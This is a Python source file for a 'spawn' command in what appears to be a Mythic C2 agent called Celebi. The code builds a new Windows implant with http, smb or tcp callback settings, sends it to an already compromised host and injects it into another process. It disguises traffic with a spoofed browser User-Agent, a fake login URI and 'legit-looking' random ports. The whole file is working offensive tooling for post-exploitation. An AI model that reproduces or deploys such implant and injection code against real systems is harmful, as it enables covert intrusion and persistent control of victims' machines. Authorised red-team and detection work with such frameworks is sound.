from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

import asyncio, json, random

class SpawnArguments(TaskArguments):

	def __init__(self, command_line, **kwargs):
		super().__init__(command_line, **kwargs)
		self.args = [
			CommandParameter(
				name="c2_profile",
				cli_name="c2_profile",
				display_name="C2 Profile",
				type=ParameterType.ChooseOne,
				choices=["http", "smb", "tcp"],
				parameter_group_info=[ ParameterGroupInfo(required=True, ui_position=0) ]
			),
			CommandParameter(
				name="host",
				cli_name="host",
				display_name="Host",
				type=ParameterType.String,
				parameter_group_info=[ ParameterGroupInfo(required=False, ui_position=1) ]
			),
			CommandParameter(
				name="port",
				cli_name="port",
				display_name="Port (tcp)",
				type=ParameterType.Number,
				parameter_group_info=[ ParameterGroupInfo(required=False, ui_position=2) ]
			),
			CommandParameter(
				name="pipename",
				cli_name="pipename",
				display_name="Pipe Name (smb)",
				type=ParameterType.String,
				parameter_group_info=[ ParameterGroupInfo(required=False, ui_position=3) ]
			)
		]

	async def parse_arguments(self):
		if len(self.command_line) == 0:
			raise Exception("Please provide a JSON blob with c2_profile (and host for http).")
		if self.command_line[0] != "{":
			raise Exception("Require JSON blob, but got raw command line.")
		self.load_args_from_json_string(self.command_line)
		if len(self.get_arg("c2_profile")) == 0:
			raise Exception("You must provide a value for the c2_profile argument")
		# host is optional: for http it defaults to this agent's own callback host

class SpawnCommand(CommandBase):
	cmd = "spawn"
	help_cmd = "spawn"
	argument_class = SpawnArguments
	description = "Build a new Celebi payload with the given c2 profile, download it to this agent and inject it into the spawnto process. For smb/tcp the new agent binds a listener and waits for a link (see the task display for the generated pipe/port)."
	needs_admin = False
	version = 1
	author = "@ofasgard"
	attackmapping = ["T1055"]
	supported_ui_features = []
	attributes = CommandAttributes(
		builtin=False, # User-selectable at build time (supports_dynamic_loading)
		suggested_command=True,
	)

	async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
		response = PTTaskCreateTaskingMessageResponse(
			TaskID=taskData.Task.ID,
			Success=True,
		)
		profile = taskData.args.get_arg("c2_profile")
		host = taskData.args.get_arg("host") or ""
		if profile == "http" and not host:
			# The spawned agent runs on this machine, so inherit this callback's
			# own http callback host unless the operator said otherwise.
			for c2 in (taskData.C2Profiles or []):
				if getattr(c2, "Name", None) == "http" and getattr(c2, "Parameters", None):
					cb = c2.Parameters.get("callback_host", "")
					if cb:
						host = cb
						break
			if not host:
				raise Exception("No host given and this agent has no http profile to inherit one from")

		# Generate unique p2p bind parameters when not supplied, so several
		# spawned children on the same host don't collide. For smb, leaving the
		# pipename out lets the c2 profile's randomize=True generate the
		# canonical per-build UUID-style name; we read it back after the build.
		port = taskData.args.get_arg("port")
		pipename = taskData.args.get_arg("pipename")
		if profile == "tcp" and not port:
			# High, legit-looking ephemeral range (avoids low/common ports).
			port = random.randint(45621, 59832)

		if profile == "http":
			cb_host = host if "://" in host else "http://" + host
			params = {
				"callback_host": cb_host, "callback_port": 80,
				"post_uri": "login/process.php", "get_uri": "index", "query_path_name": "q",
				"callback_interval": 4, "callback_jitter": 0, "killdate": "",
				"headers": {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"},
				"AESPSK": "aes256_hmac", "encrypted_exchange_check": False,
				"proxy_host": "", "proxy_port": "", "proxy_user": "", "proxy_pass": "",
			}
		elif profile == "tcp":
			params = {"port": str(port), "localhost_only": False, "killdate": "",
			          "encrypted_exchange_check": True, "AESPSK": "aes256_hmac"}
		else:
			params = {"killdate": "",
			          "encrypted_exchange_check": True, "AESPSK": "aes256_hmac"}
			if pipename:
				params["pipename"] = pipename

		config = MythicRPCPayloadConfiguration(
			description="{} spawned from task {}".format(taskData.Task.OperatorUsername, taskData.Task.DisplayID),
			payload_type="celebi",
			c2_profiles=[{"c2_profile": profile, "c2_profile_parameters": params}],
			build_parameters=[{"name": "debug", "value": False},
			                  {"name": "exit_func", "value": "process"}],
			commands=["exit", "whoami", "sleep", "register", "unregister", "execute_pico", "morph",
			          "link", "unlink", "spawn", "spawnto", "ls", "ps", "cat", "pwd", "change", "cd"],
			selected_os="Windows",
			filename="spawn-{}.bin".format(profile),
		)
		createResp = await SendMythicRPCPayloadCreateFromScratch(MythicRPCPayloadCreateFromScratchMessage(
			TaskID=taskData.Task.ID,
			PayloadConfiguration=config,
		))
		if not createResp.Success:
			raise Exception("Failed to start payload build: {}".format(createResp.Error))

		# Poll until the build completes.
		new_uuid = createResp.NewPayloadUUID
		agent_file_id = None
		for _ in range(180):
			search = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(PayloadUUID=new_uuid))
			if not search.Success:
				raise Exception("Failed to poll payload build: {}".format(search.Error))
			phase = search.Payloads[0].BuildPhase
			if phase == "success":
				agent_file_id = search.Payloads[0].AgentFileId
				break
			if phase == "error":
				raise Exception("Payload build failed: {}".format(search.Payloads[0].BuildStderr))
			await asyncio.sleep(2)
		if agent_file_id is None:
			raise Exception("Timed out waiting for payload build")

		# The agent gets the file id + the tcp port (0 for non-tcp) so it can
		# verify the port is free before injecting the child.
		taskData.args.add_arg("file", agent_file_id)
		taskData.args.add_arg("port", int(port or 0))
		extra = ""
		if profile == "tcp":
			extra = ", port {}".format(port)
		elif profile == "smb":
			# If the operator didn't supply a pipename, the c2 profile's
			# randomize=True generated one at build time — read it back so the
			# operator knows what to link to.
			if not pipename:
				for c2 in (search.Payloads[0].C2Profiles if search.Payloads else []):
					if getattr(c2, "Name", None) == "smb" and getattr(c2, "Parameters", None):
						pipename = c2.Parameters.get("pipename") or pipename
						break
			extra = ", pipename {}".format(pipename)
		response.DisplayParams = "Built {} payload (file {}{})".format(profile, agent_file_id[:8], extra)
		return response
